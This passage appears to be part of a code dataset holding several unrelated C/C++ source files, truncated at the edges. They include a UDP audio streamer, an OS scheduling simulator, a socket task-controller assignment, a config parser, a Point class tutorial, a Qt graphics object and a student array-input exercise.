atoi(channels.c_str());\n\n    samplerate_441_base = isamplerate % 44100 == 0;\n    samplerate_multiplier = samplerate_441_base ? isamplerate / 44100 : isamplerate / 48000;\n    samplerate_mask = (samplerate_441_base << 7) + samplerate_multiplier;\n\n    header[0] = samplerate_mask;\n    header[1] = ibitdepth;\n    header[2] = ichannels;\n    header[3] = channel_map[0];\n    header[4] = channel_map[1];\n    \n    memcpy(buffer_pending, header, PACKET_HEADER_SIZE);\n    \n    // Send Data\n    while (retval == 0) {\n        // Read bytes in, append to the end of buffer_pending\n        int bytes_read = read(STDIN_FILENO, buffer_pending_data + buffer_pending_bytes, PACKET_DATA_SIZE);\n        if (bytes_read <= 0) {\n            printf(\"Lost stdin: %i\\n\", bytes_read);\n            retval = 4;\n            continue;\n        }\n        buffer_pending_bytes = buffer_pending_bytes + bytes_read;\n        // If there's >= PACKET_DATA_SIZE bytes then send PACKET_DATA_SIZE bytes\n        if (buffer_pending_bytes >= PACKET_DATA_SIZE)\n        {\n            int result = sendto(socket_fd, buffer_pending, PACKET_SIZE, 0,\n                    (sockaddr*)&destination, sizeof(destination));\n            if (result >= 0)\n            {\n                // Shift the buffer up PACKET_DATA_SIZE bytes to remove the data that was just sent\n                memcpy(buffer_pending_data,\n                    buffer_pending_data + PACKET_DATA_SIZE,\n                    PACKET_DATA_SIZE);\n                buffer_pending_bytes -= PACKET_DATA_SIZE;\n            }\n            else\n            {\n                printf(\"Error sending message: %i\\n\", result);\n                retval = result;\n            }\n        }\n    }\n    close(socket_fd);\n    return retval;\n}",
    "// Riyuan Liu\n#include \"SimOS.h\"\n#include <iostream>\n\n// Constructor\nSimOS::SimOS(int numDisks, unsigned long long ram, unsigned int pSize)\n        : numberOfDisks(numDisks),\n          amountOfRAM(ram),\n          pageSize(pSize),\n          diskQueues(numDisks), // Initialize diskQueues vector with numDisks deques\n          currentFileRead(numDisks)\n{};\n\n// Create a new process and add it to the ready queue or assign to CPU if it's free\nvoid SimOS::NewProcess() {\n    int pid = currentPID++;\n    Process newProcess{pid};\n    processes[pid] = newProcess;\n    // get in ready que\n    inque(pid);\n}\nvoid SimOS::inque(int pid){\n    if(currentCPU==NO_PROCESS){\n        currentCPU = pid;\n    }else{\n        readyQueue.push_back(pid);\n    }\n}\n// Simulate process forking\nvoid SimOS::SimFork() {\n    if (currentCPU == NO_PROCESS) {\n        throw std::logic_error(\"No process is currently running on the CPU\");\n    }\n\n    int pid = currentPID++;\n    Process child{pid};\n    child.parentPID = currentCPU;\n    processes[currentCPU].childPIDs.push_back(pid);\n    processes[pid] = child;\n    // in ready queue\n    inque(pid);\n}\n\nvoid SimOS::removeProcessFromTheSystem(int pid) {\n    // Remove from the process map\n    processes.erase(pid);\n\n    // Check and remove from the current CPU if it's running this process\n    if (currentCPU == pid) {\n        currentCPU = NO_PROCESS;\n    }\n\n    // Remove from readyQueue\n    auto it = std::remove(readyQueue.begin(), readyQueue.end(), pid);\n    readyQueue.erase(it, readyQueue.end());\n\n    // Remove from each disk queue\n    for (auto& queue : diskQueues) {\n        for (auto it = queue.begin(); it != queue.end();) {\n            if (it->PID == pid) {\n                it = queue.erase(it);  // Efficiently erase and move iterator\n            } else {\n                ++it;\n            }\n        }\n    }\n\n    // Remove from memory usage records\n    memoryFrames.erase(\n        std::remove_if(memoryFrames.begin(), memoryFrames.end(),\n                       [pid](const MemoryItem& item) { return item.PID == pid; }),\n        memoryFrames.end());\n\n    // Remove from wait queue\n    waitque.erase(pid);\n\n    // Check and remove from currentFileRead if it's involved in current I/O operations\n    for (auto& request : currentFileRead) {\n        if (request.PID == pid) {\n            request.PID = NO_PROCESS;  // Set PID to NO_PROCESS indicating no process\n            request.fileName = \"\";     // Clear the file name\n        }\n    }\n    if(!readyQueue.empty()){\n        currentCPU = readyQueue.front();\n        readyQueue.pop_front();\n    }\n    for(int i = 0;i<currentFileRead.size();i++){\n        if(currentFileRead[i].PID==NO_PROCESS && !diskQueues[i].empty()){\n            currentFileRead[i] = diskQueues[i].front();\n            //diskQueues[i].pop_front();\n        }\n    }\n}\n\n// Helper function to recursively terminate processes\nvoid SimOS::terminateProcessAndDescendants(int pid) {\n    // Retrieve the process to terminate it along with its descendants.\n    Process& proc = processes[pid];\n\n    // Release the memory used by this process immediately.\n    releaseMemory(pid);\n\n    // Recursively terminate all child processes and remove them from the system.\n    for (int childPid : proc.childPIDs) {\n        terminateProcessAndDescendants(childPid);\n        removeProcessFromTheSystem(childPid);\n    }\n\n    // Handle termination based on parent's state.\n    if (proc.parentPID != NO_PROCESS) {\n        Process& parent = processes[proc.parentPID];\n        if (parent.isWaiting) {\n            // If the parent is waiting, reactivate the parent.\n            waitque.erase(proc.parentPID);\n            if (currentCPU != proc.parentPID) {\n                inque(proc.parentPID);\n            }\n            parent.isWaiting = false;\n            processes.erase(pid);  // Remove the process after handling.\n        }\n    } else {\n        // If no parent, remove the process directly.\n        processes.erase(pid);\n    }\n}\n\nvoid SimOS::releaseMemory(int pid) {\n    // Efficiently remove memory frames associated with the given PID.\n    memoryFrames.erase(std::remove_if(memoryFrames.begin(), memoryFrames.end(),\n                                      [pid](const MemoryItem& item) { return item.PID == pid; }),\n                       memoryFrames.end());\n}\n\nvoid SimOS::SimExit() {\n    // Ensure there's a process to exit.\n    if (currentCPU == NO_PROCESS) {\n        throw std::logic_error(\"No process is currently running on the CPU to exit.\");\n    }\n    processes[currentCPU].isZombie = true;\n    // Save the PID of the current process and check for a parent.\n    int pidToExit = currentCPU;\n    int parentPID = processes[pidToExit].parentPID;\n\n    // Initiate termination and clean-up.\n    terminateProcessAndDescendants(pidToExit);\n\n    // Handle post-termination logic based on the parent's state.\n    if (parentPID != NO_PROCESS && processes.find(parentPID) != processes.end()) {\n        Process& parent = processes[parentPID];\n        if (parent.isWaiting) {\n        ",
    "//-------------------------------------------------------------------------------------------\n// File:   practica_4.hpp\n// Author: Carlos Solana Melero (872815) - Diego Mateo Lorente (873338)\n// Date:   11-11-2023\n// Coms:   Programa que, mediante la ayuda de monitores, consigue coger una tarea del b\u00faffer, asignarla a un controlador, procesarla y, finalmente,\n//         muestra los resultados de la ejecuci\u00f3n de las tareas por pantalla\n//-------------------------------------------------------------------------------------------\n\n#include <string>\n#include <iostream>\n#include <sstream>\n#include <cstdlib>\n#include <thread>\n#include <chrono>\n#include <unistd.h>\n#include <iomanip>\n#include <fstream>\n#include <vector>\n#include <Socket.hpp>\n\nusing namespace std;\n\nconst int N_CONTROLLERS = 10;\nconst string nombreFichero = \"tareas.txt\";\nconst unsigned N_TIPOS_TAREA = 3;\nconst string MENS_FIN = \"TF\";\nconst string PEDIR_T = \"GET_TASK\";\n//----------------------------------------------------\nstruct tarea {\n    string tipoTarea;\n    float cargaDeTrabajo;\n};\n//Pre:  0 <= id < N_CONTROLLERS\nvoid controllerTask(unsigned int id,Socket& sock1,Socket& sock2, int& socket_fd_1, int& socket_fd_2) {\n    \n    // Buffer para recibir el mensaje\n    int length = 100;\n    int i = 0;\n    string buffer;\n    string msg;\n    string cargaTrabajo;\n    string resultado;\n    string tipoTarea;\n    bool out = false; // Inicialmente no salir del bucle\n    int numGen;\n    while(!out) {\n        int snd_bytes = sock1.Send(id,PEDIR_T); // en vez de client_fd_1 seria id??\n        if (snd_bytes == -1) {\n            cerr << sock1.error(\"Error al mandar datos\");\n            // Cerramos los sockets\n            sock1.Close(id); // en vez de client_fd_1 seria id??\n        }\n\n        int rcv_bytes = sock1.Receive(id,buffer,length); // en vez de client_fd_1 seria id??\n        if (rcv_bytes == -1) {\n            cerr << sock1.error(\"Error al recibir datos\");\n            // Cerramos los sockets\n            sock1.Close(id); // en vez de client_fd_1 seria id??\n        }\n        \n        istringstream ss(buffer);\n        // Iterar hasta que no haya m\u00e1s trozos\n        getline(ss, tipoTarea,',');\n        if(tipoTarea != MENS_FIN){      \n            getline(ss, cargaTrabajo);\n            srand(id + time(NULL) + i);\n            numGen = rand() % (100 + 1);\n            i++;\n            if(tipoTarea == \"t1\") {                         //Esperamos a tener permiso para escribir en la matriz\n                if (numGen>=5){                         //5% de fallo\n                    this_thread::sleep_for(chrono::milliseconds(stoi(cargaTrabajo)));\n                    resultado = \"OK\";\n                }\n                else{\n                    resultado = \"NO_OK\";\n                }\n            }\n            if(tipoTarea == \"t2\") {\n                if (numGen>=7){                         //7% de fallo\n                    this_thread::sleep_for(chrono::milliseconds(stoi(cargaTrabajo)));\n                    resultado = \"OK\";\n                }\n                else{\n                    resultado = \"NO_OK\";\n                }\n            }\n            if(tipoTarea == \"t3\") {                    //Aumentamos en 1 el n\u00famero de veces ejecutado t3\n                if (numGen>=10){                        //10% de fallo\n                    this_thread::sleep_for(chrono::milliseconds(stoi(cargaTrabajo)));\n                    resultado = \"OK\";\n                }\n                else{\n                    resultado = \"NO_OK\";\n                }\n            }\n            msg = tipoTarea + \",\" + resultado + \",\" + cargaTrabajo;\n           \n            snd_bytes = sock2.Send(id,msg);\n\n            if (snd_bytes == -1) {\n                cerr << sock2.error(\"Error al mandar datos\");\n                // Cerramos los sockets\n                sock2.Close(id);\n            }\n        }\n        else{\n            out = true;\n            snd_bytes = sock2.Send(id,MENS_FIN);\n            if (snd_bytes == -1) {\n                cerr << sock2.error(\"Error al mandar datos\");\n                // Cerramos los sockets\n                sock2.Close(id);\n            }\n            rcv_bytes = sock2.Receive(id,buffer,length);\n            if (rcv_bytes == -1) {\n                cerr << sock2.error(\"Error al recibir datos\");\n                // Cerramos los sockets\n                sock2.Close(id);// en vez de client_fd_1 seria id??\n            }\n            if(buffer != \"END\") {\n                cerr << sock2.error(\"No ha llegado el mensaje esperado. Adios.\");\n                sock2.Close(id);\n            }\n            else {\n                snd_bytes = sock1.Send(id,buffer);\n                if(snd_bytes == -1) {\n                    cerr << sock1.error(\"Error al mandar mensaje. Adios.\");\n                }\n            }\n        }\n    }    \n    sock1.Close(id);\n    sock2.Close(id);\n}\n\nint main(int argc, char* argv[]) {\n    const string MENS_FIN = \"TF\";\n    // Direcci\u00f3n y n\u00famero donde escucha el proceso servidor\n    string SERVER_ADDRESS_1 =",
    "#include \"../include/Parser.hpp\"\n\n#include <fstream>\n#include <sstream>\n\nint main(int argc, char *argv[]) {\n  if (argc < 2) {\n    std::cerr << \"Usage: \" << argv[0] << \" <filename>\" << std::endl;\n    return 1;\n  }\n\n  std::ifstream file(argv[1]);\n  if (!file.is_open()) {\n    std::cerr << \"Could not open file: \" << argv[1] << std::endl;\n    return 1;\n  }\n\n  std::stringstream buffer;\n  buffer << file.rdbuf();\n  std::string strInput = buffer.str();\n\n  CLexer lexer(strInput);\n  CParser parser(lexer);\n\n  try {\n    auto vecSections = parser.parse();\n\n    // Print parsed configuration\n    for (const auto &section : vecSections) {\n      std::cout << \"Section: \" << section.m_strName << std::endl;\n      for (const auto &parameter : section.m_vecParameters) {\n        std::cout << \"  Parameter: \" << parameter.m_strName << std::endl;\n        std::cout << \"    Value: \";\n        if (std::holds_alternative<std::string>(parameter.m_varValue)) {\n          std::cout << std::get<std::string>(parameter.m_varValue) << std::endl;\n        } else if (std::holds_alternative<int>(parameter.m_varValue)) {\n          std::cout << std::get<int>(parameter.m_varValue) << std::endl;\n        } else if (std::holds_alternative<std::vector<std::string>>(\n                       parameter.m_varValue)) {\n          for (const auto &val :\n               std::get<std::vector<std::string>>(parameter.m_varValue)) {\n            std::cout << val << \" \";\n          }\n          std::cout << std::endl;\n        }\n        std::cout << \"    Description: \" << parameter.m_strDescription\n                  << std::endl;\n        for (const auto &rule : parameter.m_tValidation.m_mapRules) {\n          std::cout << \"    Validation: \" << rule.first << \" = \";\n          if (std::holds_alternative<std::string>(rule.second)) {\n            std::cout << std::get<std::string>(rule.second) << std::endl;\n          } else if (std::holds_alternative<int>(rule.second)) {\n            std::cout << std::get<int>(rule.second) << std::endl;\n          }\n        }\n      }\n      for (const auto &subSection : section.m_vecSections) {\n        std::cout << \"  Sub-section: \" << subSection.m_strName << std::endl;\n      }\n    }\n  } catch (const std::exception &e) {\n    std::cerr << \"Error: \" << e.what() << std::endl;\n    return 1;\n  }\n\n  return 0;\n}\n",
    "\ufeff#include<iostream>\nusing namespace std;\nusing std::cin;\nusing std::cout;\nusing std::endl;\n\n#define delimiter \"\\n-------------------------------\\n\"\n\n//\u041e\u0431\u044a\u044f\u0432\u043b\u044f\u044f \u0441\u0442\u0440\u0443\u043a\u0442\u0443\u0440\u0443 \u0438\u043b\u0438 \u043a\u043b\u0430\u0441\u0441 \u043c\u044b \u0441\u043e\u0437\u0434\u0430\u0435\u043c \u043d\u043e\u0432\u044b\u0439 \u0442\u0438\u043f \u0434\u0430\u043d\u043d\u044b\u0445 (\u043f\u043e\u043b\u044c\u0437\u043e\u0432\u0430\u0442\u0435\u043b\u044c\u0441\u043a\u0438\u0439 \u0442\u0438\u043f \u0434\u0430\u043d\u043d\u044b\u0445).\nclass Point\n{\n\tdouble x;\n\tdouble y;\npublic:\n\tdouble get_x()const\n\t{\n\t\treturn x;\n\t}\n\tdouble get_y()const\n\t{\n\t\treturn y;\n\t}\n\tvoid set_x(double x)\n\t{\n\t\tthis->x = x;\n\t}\n\tvoid set_y(double y)\n\t{\n\t\tthis->y = y;\n\t}\n\n\t//\t\t\t\tConstrcutors:\n\t/*Point()\n\t{\n\t\tx = y = 0;\n\t\tcout << \"DefaultConstructor:\\t\" << this << endl;\n\t}*/\n\t/*Point(double x)\n\t{\n\t\tthis->x = x;\n\t\tthis->y = 0;\n\t\tcout << \"1ArgConstructor:\\t\" << this << endl;\n\t}*/\n\tPoint(double x = 0, double y = 0)\n\t{\n\t\tthis->x = x;\n\t\tthis->y = y;\n\t\tcout << \"Constrcutor:\\t\\t\" << this << endl;\n\t}\n\tPoint(const Point& other)\n\t{\n\t\tthis->x = other.x;\n\t\tthis->y = other.y;\n\t\tcout << \"CopyConstrcutor:\\t\" << this << endl;\n\t}\n\t~Point()\n\t{\n\t\tcout << \"Destructor:\\t\\t\" << this << endl;\n\t}\n\t        //         Operators:\n\tPoint& operator=(const Point& other)\n\t{\n\t\tthis->x = other.x;\n\t\tthis->y = other.y;\n\t\tcout << \"CopyAssignment:\\t\\t\" << this << endl;\n\t\treturn *this;\n\t}\n\tPoint& operator++() // Prefix increment\n\t{\n\t\tx++;\n\t\ty++;\n\t\treturn *this;\n\t}\n\tPoint operator++(int)\n\t{\n\t\tPoint old = *this;\n\t\tx++;\n\t\ty++;\n\t\treturn old;\n\t}\n\n\t                //\tMethods:\n\tdouble distance(const Point other)const\n\t{\n\t\t//other.x *= 10;\n\t\t\n\t\tdouble x_distance = this->x - other.x;\n\t\tdouble y_distance = this->y - other.y;\n\t\tdouble distance = sqrt(x_distance * x_distance + y_distance * y_distance);\n\t\t//sqrt() - Square Root (\u041a\u0432\u0430\u0434\u0440\u0430\u0442\u043d\u044b\u0439 \u043a\u043e\u0440\u0435\u043d\u044c)\n        //this->x *= 10;\n\t\treturn distance;\n\t}\n\tvoid print()const\n\t{\n\t\tcout << \"X = \" << x << \"\\tY = \" << y << endl;\n\t}\n};\n\ndouble distance(const Point& A,const Point& B)\n{\n\t//A.set_(A)\n\tdouble x_distance = A.get_x() - B.get_x();\n\tdouble y_distance = A.get_y() - B.get_y();\n\tdouble distance = sqrt(x_distance * x_distance + y_distance * y_distance);\n\treturn distance;\n}\n\nPoint operator+(const Point& left, const Point& right)\n{\n\tPoint result;\n\tresult.set_x(left.get_x() + right.get_x());\n\tresult.set_y(left.get_y() + right.get_y());\n\treturn result;\n}\n\nbool operator==(const Point& left, const Point& right)\n{\n\t/*if (left.get_x() == right.get_x() && left.get_y() == right.get_y())\n\t\treturn true;\n\telse\n\t\treturn false;*/\n\treturn left.get_x() == right.get_x() && left.get_y() == right.get_y();\n}\n\nstd::ostream& operator<<(std::ostream& os, const Point& obj)\n{\n\treturn os << \"X=\" << obj.get_x() << \"\\tY=\" << obj.get_y();\n}\n\n\n//#define STRUCT_POINT\n//#define CONSTRUCTORS_CHECK\n//#define DISTANCE_CHECK\n//#define ASSIGNMENT_CHEK\n//#define ARITHMETICAL_OPERATOR_CHECK\n//#define COMPARISON_OPERATORS_CHECK\n\nvoid main()\n{\n\tsetlocale(LC_ALL, \"\");\n\n#if defined STRUCT_POINT\n\tint a;\t\t//\u041e\u0431\u044a\u044f\u0432\u043b\u0435\u043d\u0438\u0435 \u043f\u0435\u0440\u0435\u043c\u0435\u043d\u043d\u043e\u0439 'a' \u0442\u0438\u043f\u0430 'int'\n\tPoint A;\t//\u041e\u0431\u044a\u044f\u0432\u043b\u0435\u043d\u0438\u0435 \u043f\u0435\u0440\u0435\u043c\u0435\u043d\u043d\u043e\u0439 'A' \u0442\u0438\u043f\u0430 'Point'\n\t//\u0421\u043e\u0437\u0434\u0430\u043d\u0438\u0435 \u043e\u0431\u044a\u0435\u043a\u0442\u0430 'A' \u0442\u0438\u043f\u0430 'Point'\n\t//\u0421\u043e\u0437\u0434\u0430\u043d\u0438\u0435 \u044d\u043a\u0437\u043c\u0435\u043f\u043b\u044f\u0440\u0430 'A' \u0441\u0442\u0440\u0443\u043a\u0442\u0443\u0440\u044b 'Point'\n\tA.x = 2;\n\tA.y = 3;\n\tcout << A.x << \"\\t\" << A.y << endl;\n\n\tPoint* pA = &A;\n\tcout << pA->x << \"\\t\" << pA->y << endl;\n#endif // STRUCT_POINT\n\n#ifdef CONSTRUCTORS_CHECK\n\tPoint A;\t\t//Default constructor\n\t//A.set_x(2);\n\t//A.set_y(3);\n\tcout << A.get_x() << \"\\t\" << A.get_y() << endl;\n\tA.print();\n\n\tPoint B = 5;\t//Single-Argument Constructor\n\tB.print();\n\n\tPoint C(2, 3);\n\tC.print();\n\n\tPoint D = C;   //Copy constructor\n\tD.print();\n\n\tPoint E;\n\tE = D;   //Copy assignment\n\tE.print();\n\n\t//\tfor (counter;  condition; increment)\n\t\t/*for (int i = 0; i < 10; i++)\n\t\t{\n\t\t\tcout << i << \"\\t\";\n\t\t}*/\n\t\t//cout << i << endl;\n\t\t//cout << endl;\n#endif // CONSTRUCTORS_CHECK\n\n#ifdef DISTANCE_CHECK\n\tPoint A(2, 3);\n\tPoint B(7, 8);\n\n\tA.print();\n\tB.print();\n\n\tcout << delimiter << endl;\n\tcout << \"\u0420\u0430\u0441\u0441\u0442\u043e\u044f\u043d\u0438\u0435 \u043e\u0442 \u0442\u043e\u0447\u043a\u0438 'A' \u0434\u043e \u0442\u043e\u0447\u043a\u0438 'B':\" << A.distance(B) << endl;\n\tcout << delimiter << endl;\n\tcout << \"\u0420\u0430\u0441\u0441\u0442\u043e\u044f\u043d\u0438\u0435 \u043e\u0442 \u0442\u043e\u0447\u043a\u0438 'B' \u0434\u043e \u0442\u043e\u0447\u043a\u0438 'A':\" << B.distance(A) << endl;\n\tcout << delimiter << endl;\n\tcout << \"\u0420\u0430\u0441\u0441\u0442\u043e\u044f\u043d\u0438\u0435 \u043c\u0435\u0436\u0434\u0443 \u0442\u043e\u0447\u043a\u0430\u043c\u0438 'A' \u0438 'B':  \" << distance(A, B) << endl;\n\tcout << delimiter << endl;\n\tcout << \"\u0420\u0430\u0441\u0441\u0442\u043e\u044f\u043d\u0438\u0435 \u043c\u0435\u0436\u0434\u0443 \u0442\u043e\u0447\u043a\u0430\u043c\u0438 'B' \u0438 'A':  \" << distance(B, A) << endl;\n\tcout << delimiter << endl;\n#endif // DISTANCE_CHECK\n\n#ifdef ASSIGNMENT_CHEK\n\tint a, b, c;\n\ta = b = c = 0;\n\tcout << a << \"\\t\" << b << \"\\t\" << c << endl;\n\n\tPoint A, B, C;\n\n\tcout << delimiter << endl;\n\tA = B = C = Point(2, 3);    //Point(2,3)-\u044f\u0432\u043d\u043e \u0432\u044b\u0437\u044b\u0432\u0430\u0435\u043c \u043a\u043e\u043d\u0441\u0442\u0440\u0443\u043a\u0442\u043e\u0440\n\t                            // \u0438 \u0441\u043e\u0437\u0434\u0430\u0435\u043c \u0432\u0440\u0435\u043c\u0435\u043d\u043d\u044b\u0439 \u0431\u0435\u0437\u044b\u043c\u044f\u043d\u044b\u0439 \u043e\u0431\u044a\u0435\u043a\u0442,\n                               // \u044d\u0442\u043e\u0442 \u043e\u0431\u044a\u0435\u043a\u0442 \u0438 \u043f\u0435\u0440\u0435\u0434\u0430\u0435\u0442\u0441\u044f\u043a\u0430\u043a \u043f\u0430\u0440\u0430\u043c\u0435\u0442\u0440\n\t                          // \u0432 \u043f\u0435\u0440\u0432\u044b\u0439 CopyAssignment.\n    cout << delimiter << endl;\n\n\n\tA.print();\n\tB.print();\n\tC.print();\n\tcout << delimiter << endl;\n\n\n#endif // ASSIGNMENT_CHEK\n\n#ifdef ARITHMETICAL_OPERATOR_CHECK\n\tint a = 2;\n\tint b = 3;\n\tint c=a+b;\n\n\tPoint A(2, 3);\n\tA.print();\n\n\tPoint B(7, 8);\n\tB.print();\n\n\tPoint C = A + B;\n\tC.print();\n\n\tPoint D = C++;\n\tC.print();\n\tD.print();\n\n#endif // ARITHMETICAL_OPERATOR_CHECK\n\n#ifdef COMPARISON_OPERATORS_CHECK\n\n\t//cout << (2 == 3)<<endl;\n\tPoint A(2, 3);\n\tPoin",
    "#include \"baseobject.h\"\r\n\r\n#include \"mainview.h\"\r\n#include \"mainscene.h\"\r\n\r\nstatic const char objTypeString_string[] = {\r\n    \"Base\\0\"\r\n    \"Line\\0\"\r\n    \"Rect\\0\"\r\n    \"Text\\0\"\r\n    \"Ellipse\\0\"\r\n};\r\n\r\nstatic const short objTypeString_indices[] = {\r\n    0, 5, 10, 15, 20, 28, 0\r\n};\r\n\r\nQColor BaseObject::gBorderColor = QColor(8,255,200);\r\nQColor BaseObject::gObjectColor = Qt::white;\r\nqreal BaseObject::gMoveOffset = 10;\r\n\r\n\r\nBaseObject::BaseObject(QGraphicsObject* parent)\r\n    : QGraphicsObject(parent)\r\n    , beSelected(false)\r\n    , myObjectColor(BaseObject::gObjectColor)\r\n    , myPenWidthF(1)\r\n{\r\n    //\u8bbe\u7f6e\u9f20\u6807\u548c\u4ea4\u4e92\u884c\u4e3a\r\n    //\u8bbe\u7f6e\u63a5\u53d7\u9f20\u6807\u5de6\u952e\u548c\u53f3\u952e\u4e8b\u4ef6\r\n    this->setAcceptedMouseButtons(Qt::LeftButton | Qt::RightButton);\r\n    //\u8bbe\u7f6eitems\u63a5\u53d7\u9f20\u6807\u60ac\u505c\u4e8b\u4ef6\r\n    this->setAcceptHoverEvents(true);\r\n    //\u8bbe\u7f6eitems\u53ef\u4ee5\u88ab\u79fb\u52a8\u3001\u88ab\u9009\u62e9\u3001\u63a5\u53d7\u7126\u70b9\r\n    this->setFlags(QGraphicsItem::ItemIsMovable |\r\n                   QGraphicsItem::ItemIsSelectable |\r\n                   QGraphicsItem::ItemIsFocusable);\r\n\r\n\r\n    gPen.setBrush(Qt::NoBrush);\r\n    gPen.setColor(myObjectColor);\r\n    gPen.setWidthF(myPenWidthF);\r\n}\r\n\r\nBaseObject::~BaseObject()\r\n{\r\n\r\n}\r\n\r\nbool BaseObject::isLine() const\r\n{\r\n    return objType() == BaseObject::Line;\r\n}\r\n\r\nbool BaseObject::isRect() const\r\n{\r\n    return objType() == BaseObject::Rect;\r\n}\r\n\r\nvoid BaseObject::drawSelectedRect(QPainter *painter)\r\n{\r\n    QRectF rect = this->boundingRect();\r\n\r\n    painter->setPen(QPen(BaseObject::gBorderColor, 0, Qt::DashLine));\r\n    painter->setBrush(Qt::NoBrush);\r\n    painter->drawRect(rect.adjusted(-1,-1,1,1));//\u5411\u5185\u7f29\u4e00\u4e2a\u50cf\u7d20\uff0c\u907f\u514d\u88ab\u526a\u88c1\r\n}\r\n\r\nQString BaseObject::nameString() const\r\n{\r\n    return QLatin1String(objTypeString_string + objTypeString_indices[this->objType()]);\r\n}\r\n\r\nBaseObject::OBJTYPE BaseObject::objType() const\r\n{\r\n    return BaseObject::Base;\r\n}\r\n\r\n\r\n/*BaseObject::m_handlesArea BaseObject::getMouseHandle(QPointF p)\r\n{\r\n    QRectF rect = this->boundingRect();\r\n\r\n    qreal left = rect.left();\r\n    qreal right = rect.right();\r\n    qreal top = rect.top();\r\n    qreal bottom = rect.bottom();\r\n\r\n    if(p.x() >= left - m_HandleSize && p.x() <= left + m_HandleSize){\r\n        if(p.y() > bottom + m_HandleSize && p.y() < top - m_HandleSize){\r\n            return BaseObject::LeftMiddle;\r\n            qDebug() << \"LeftMiddle\";\r\n        }\r\n        else if(p.y() <= bottom + m_HandleSize && p.y() >= bottom - m_HandleSize){\r\n            return BaseObject::LeftBottom;\r\n            qDebug() << \"LeftBottom\";\r\n        }\r\n        else if(p.y() >= top - m_HandleSize && p.y() <= top + m_HandleSize){\r\n            return BaseObject::LeftTop;\r\n            qDebug() << \"LeftTop\";\r\n        }\r\n    }\r\n    else if(p.x() >= right - m_HandleSize && p.x() <= right + m_HandleSize){\r\n        if(p.y() > bottom + m_HandleSize && p.y() < top - m_HandleSize){\r\n            return BaseObject::RightMiddle;\r\n            qDebug() << \"RightMiddle\";\r\n        }\r\n        else if(p.y() <= bottom + m_HandleSize && p.y() >= bottom - m_HandleSize){\r\n            return BaseObject::RightBottom;\r\n            qDebug() << \"RightBottom\";\r\n        }\r\n        else if(p.y() >= top - m_HandleSize && p.y() <= top + m_HandleSize){\r\n            return BaseObject::RightTop;\r\n        }\r\n    }\r\n    else if(p.x() > left + m_HandleSize && p.x() < right - m_HandleSize){\r\n        if(p.y() <= bottom + m_HandleSize && p.y() >= bottom - m_HandleSize){\r\n            return BaseObject::BottomMiddle;\r\n        }\r\n        else if(p.y() >= top - m_HandleSize && p.y() <= top + m_HandleSize){\r\n            return BaseObject::TopMiddle;\r\n        }\r\n    }\r\n}*/\r\n\r\n\r\nvoid BaseObject::mousePressEvent(QGraphicsSceneMouseEvent *event)\r\n{\r\n    beSelected = true;\r\n    QGraphicsView* view = this->scene()->views()[0];//\u83b7\u53d6\u56fe\u5143\u6240\u5c5e\u7684view\r\n    view->viewport()->setCursor(Qt::SizeAllCursor);//\u8bbe\u7f6e\u9f20\u6807\u4e3a\u624b\u578b\r\n\r\n    QGraphicsObject::mousePressEvent(event);\r\n}\r\n\r\nvoid BaseObject::mouseMoveEvent(QGraphicsSceneMouseEvent *event)\r\n{\r\n\r\n    QGraphicsObject::mouseMoveEvent(event);\r\n}\r\n\r\nvoid BaseObject::mouseReleaseEvent(QGraphicsSceneMouseEvent *event)\r\n{\r\n    QGraphicsObject::mouseReleaseEvent(event);\r\n}\r\n\r\nvoid BaseObject::hoverEnterEvent(QGraphicsSceneHoverEvent *event)\r\n{\r\n\r\n    if(!this->isSelected()){\r\n        //gPen.setColor(Qt::red);\r\n        this->setPenColor(Qt::red);\r\n        update();\r\n    }\r\n\r\n    return QGraphicsItem::hoverEnterEvent(event);\r\n}\r\n\r\nvoid BaseObject::hoverLeaveEvent(QGraphicsSceneHoverEvent *event)\r\n{\r\n    QColor col = this->getPenColor();\r\n    gPen.setColor(col);\r\n    update();\r\n    if(!beSelected) return;\r\n\r\n    QGraphicsView* view = this->scene()->views()[0];\r\n    view->viewport()->setCursor(Qt::ArrowCursor);\r\n\r\n    return QGraphicsItem::hoverLeaveEvent(event);\r\n}\r\n",
    "/*\n  Maaz Ali\n  22i-1042\n  Assignment#04\n*/\n\n#include<iostream>\n\nusing namespace std;\nint main()\n{\n\n\tbool flag=true;\n\tint temp;\n\tint x=3,y=4,z=5,a=5,b=5;\n\t\n\tcout<<\"\\nEnter array in assending order.....\";\n\n\tcout<<\"\\nEnter array:\";\n\tint arr1[x];\n\tfor(int i=0;i<x;i++)\n\tcin>>arr1[i];\n\tfor(int j=0;j<x;j++)\n\t{\n\t\tif(arr1[j]>arr1[j+1] && j+1<x)\n\t\t{\n\t\t\tflag=false;\n\t\t\tbreak;\n\t\t}\n\t}\n\n\tcout<<\"\\nEnter array:\";\n\tint arr2[y];\n\tfor(int i=0;i<y;i++)\n\tcin>>arr2[i];\n\tfor(int j=0;j<y;j++)\n\t{\n\t\tif(arr2[j]>arr2[j+1] && j+1<y)\n\t\t{\n\t\t\tflag=false;\n\t\t\tbreak;\n\t\t}\n\t}\n\n\tcout<<\"\\nEnter array:\";\n\tint arr3[z];\n\tfor(int i=0;i<z;i++)\n\tcin>>arr3[i];\n\tfor(int j=0;j<z;j++)\n\t{\n\t\tif(arr3[j]>arr3[j+1] && j+1<z)\n\t\t{\n\t\t\tflag=false;\n\t\t\tbreak;\n\t\t}\n\t}\n\n\tcout<<\"\\nEnter array:\";\n\tint arr4[a];\n\tfor(int i=0;i<a;i++)\n\tcin>>arr4[i];\n\tfor(int j=0;j<a;j++)\n\t{\n\t\tif(arr4[j]>arr4[j+1] && j+1<a)\n\t\t{\n\t\t\tflag=false;\n\t\t\tbreak;\n\t\t}\n\t}\n\n\tcout<<\"\\nEnter array:\";\n\tint arr5[b];\n\tfor(int i=0;i<b;i++)\n\tcin>>arr5[i];\n\tfor(int j=0;j<b;j++)\n\t{\n\t\tif(arr5[j]>arr5[j+1] && j+1<b)\n\t\t{\n\t\t\tflag=false;\n\t\t\tbreak;\n\t\t}\n\t}\n\t\n\tif(flag==false)\n\t{\n\t\tcout<<\"\\nRead input in correct format....\";\n\n\t}\t\n\n\n\twhile(flag==false)\n\t{\n\n\tcout<<\"\\nEnter array:\";\n\tint arr1[x];\n\tfor(int i=0;i<x;i++)\n\tcin>>arr1[i];\n\tfor(int j=0;j<x;j++)\n\t{\n\t\tif(arr1[j]>arr1[j+1] && j+1<x)\n\t\t{\n\t\t\tflag=false;\n\t\t\tbreak;\n\t\t}\n\t}\n\tif(flag==false)\n\t{\n\t\tcout<<\"\\nRead input in correct 